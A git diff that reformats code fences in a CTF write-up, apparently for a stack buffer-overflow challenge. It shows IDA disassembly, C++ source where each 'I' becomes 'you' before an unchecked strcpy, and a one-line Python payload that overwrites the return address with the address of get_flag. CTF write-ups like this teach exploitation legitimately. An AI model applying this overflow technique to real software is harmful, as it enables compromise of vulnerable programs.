@@ -148,7 +148,8 @@ IDA outputs:
 .text:08049328 8B 5D FC                             mov     ebx, [ebp+var_4]
 .text:0804932B C9                                   leave
 .text:0804932C C3                                   retn
-.text:0804932C                      vuln            endp```
+.text:0804932C                      vuln            endp
+```
 
 This looks simple enough if you know C++ you don't even need to read the `replace` function to understand.
 
@@ -166,12 +167,14 @@ void vuln()
 	std::string fixed = replace(std::string(buffer), std::string("I"), std::string("you"));
 	strcpy(buffer, fixed.c_str());
 	printf("So %s\n", buffer);
-}```
+}
+```
 
 To exploit this, since the original input buffer is limited to 32 characters, we need to get at least 4 bytes of the buffer to the return address, located at 0x40 above the start of the buffer. `get_flag` is at 0x08048f0d.
 
 ```python
-print ('I' * 21) + 'a'  + ('\x0d\x8f\x04\x08')```
+print ('I' * 21) + 'a'  + ('\x0d\x8f\x04\x08')
+```
 
 This should get the ptr to exactly where we need it and get the flag. Because 21 * 3 is 63 + 1 is 64 == 0x40. Then the address we want.
 
